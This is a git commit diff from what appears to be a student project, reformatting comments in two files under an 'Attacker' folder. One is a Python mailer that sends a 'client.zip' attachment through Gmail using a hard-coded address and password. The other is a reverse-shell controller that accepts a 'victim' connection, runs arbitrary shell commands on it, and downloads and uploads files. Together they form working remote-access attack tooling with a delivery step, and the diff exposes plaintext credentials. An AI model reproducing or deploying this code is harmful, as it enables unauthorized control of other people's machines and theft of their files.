4823e1812d74896e1683d6ae6adc164dbe24233e
Magdalici <maria-magdalena.barbieru@student.tuiasi.ro>
2021-05-08 03:51:08 -0400

    Changed comment style

--- Attacker/sendEmail.py
+++ Attacker/sendEmail.py
@@ -9,9 +9,8 @@ mail_content = '''Hello,
 This is a test mail using Python SMTP library.
 '''
 
-'''
-	The mail addresses and password; sender_address is fake
-'''
+"""The mail addresses and password; sender_address is fake
+"""
 sender_address = 'pygame367@gmail.com'
 sender_pass = 'pygame367emagyp'
 receiver_address = 'maria-magdalena.barbieru@student.tuiasi.ro'
@@ -19,63 +18,46 @@ receiver_address = 'maria-magdalena.barbieru@student.tuiasi.ro'
 message = MIMEMultipart()
 attach_file_name = 'client.zip'
 
-'''
-	Function used to setup the MIME
-'''
+
 def setup_mime():
+    """Function used to setup the MIME
+    """
     message['From'] = sender_address
     message['To'] = receiver_address
 
-    '''
-	The subject line
-    '''
+    """The subject line"""
     message['Subject'] = 'A mail sent by Python'
 
 
-'''
-	Function used to build the body and the attachments for the mail
-'''
 def setup_email_body():
+    """Function used to build the body and the attachments for the mail"""
     message.attach(MIMEText(mail_content, 'plain'))
 
-    '''
-	Open the file as binary mode
-    '''
+    """Open the file as binary mode
+    """
     attach_file = open(attach_file_name, 'rb') 
     payload = MIMEBase('application', 'octate-stream')
     payload.set_payload((attach_file).read())
 
-    '''
-	encode the attachment
-    '''
+    """encode the attachment"""
     encoders.encode_base64(payload) 
 
-    '''
-	add payload header with filename
-    '''
+    """add payload header with filename"""
     print(basename(attach_file_name))
     payload.add_header('Content-Disposition', 'attachment', filename=attach_file_name)
     message.attach(payload)
 
-'''
-	Function used to create SMTP session for sending the mail
-'''
+
 def send_email():
-    '''
-	use gmail with port
-    '''
+    """Function used to create SMTP session for sending the mail use gmail with port"""
     session = smtplib.SMTP('smtp.gmail.com', 587) 
     
-    '''
-	enable security
-    '''
+    """ enable security """
     session.starttls() 
 
     print(sender_address + ", " + sender_pass)
 
-    '''
-	login with mail_id and password
-    '''
+    """login with mail_id and password"""
     session.login(sender_address, sender_pass) 
     text = message.as_string()
     session.sendmail(sender_address, receiver_address, text)
--- Attacker/server.py
+++ Attacker/server.py
@@ -1,29 +1,28 @@
 import socket
 import sys
 import time
-#import interface
 
-'''
-	Function used to send shell commands;
-		additional used commands: quit, download, upload
-'''
+
+# import interface
+
 def send_commands(conn):
+    """Function used to send shell commands; additional used commands: quit, download, upload
+    """
+
     client_response = conn.recv(4096)
     print(client_response.decode("utf-8"))
     while True:
         try:
             cmd = input()
-            '''
-		In case of quit command, close the connection
-            '''
+            """ In case of quit command, close the connection
+            """
             if cmd == 'quit':
                 conn.close()
                 s.close()
                 sys.exit()
             elif cmd[:8] == 'download':
-                '''
-			In the case of the 'download' command, receive the needed file using write operation
-                '''
+                """In the case of the 'download' command, receive the needed file using write operation
+                """
                 conn.send(str.encode(cmd))
                 down_file = cmd[9:]
                 receive_file = True
@@ -49,9 +48,8 @@ def send_commands(conn):
                                 f.write(client_response)
                                 client_response = conn.recv(1024)
             elif cmd[:6] == 'upload':
-                '''
-			In the case of the 'upload' command, send the added file to the victim
-                '''
+                """In the case of the 'upload' command, send the added file to the victim
+                """
                 file_name = cmd[7:]
 
                 try:
@@ -74,20 +72,16 @@ def send_commands(conn):
                     print("File not found")
                     print(client_response.decode("utf-8"))
             elif len(str.encode(cmd)) > 0:
-                '''
-			In case of other shell commands, sent them to the victim and take the  answer
-                '''
+                """In case of other shell commands, sent them to the victim and take the  answer
+                """
                 conn.send(str.encode(cmd))
                 client_response = conn.recv(4096)
                 print(client_response.decode("utf-8"))
             elif cmd == '':
-                '''
-			Otherwise, take the answer from the victim
-                '''
+                """Otherwise, take the answer from the victim
+                """
                 client_response = conn.recv(10000000)
                 print(client_response.decode("utf-8"))
-                
-          
         except (ConnectionResetError, ConnectionAbortedError):
             print("Connection with host was lost")
             s.listen(1)
@@ -97,14 +91,12 @@ def send_commands(conn):
             send_commands(conn)
 
 
-#def graphic():
-    #interface.gui()
+# def graphic():
+# interface.gui()
 
 
-'''
-	Function used to create the connection with the victim and to manage commands
-'''
 def socket_create():
+    """Function used to create the connection with the victim and to manage commands"""
     try:
         global s
         s = socket.socket()
@@ -121,24 +113,22 @@ def socket_create():
     time.sleep(0.5)
     send_commands(conn)
 
-'''
-	Function used to set the IP address and port number 
-		which should be the same as in the victim's program
-'''
+
 def main():
+    """Function used to set the IP address and port number which should be the same as in the victim's program"""
     global host
     try:
-            host = input("Enter your local host IP > ")
-            print("Set LHOST: %s" % host)
-            global port
-            port = int(input("Enter the port > "))
-            print("Set LPORT: %s" % port)
-            socket_create()
+        host = input("Enter your local host IP > ")
+        print("Set LHOST: %s" % host)
+        global port
+        port = int(input("Enter the port > "))
+        print("Set LPORT: %s" % port)
+        socket_create()
     except (ValueError, OSError, OverflowError):
         print("You entered invalid data")
         main()
 
 
 if __name__ == "__main__":
-    #graphic()
+    # graphic()
     main()
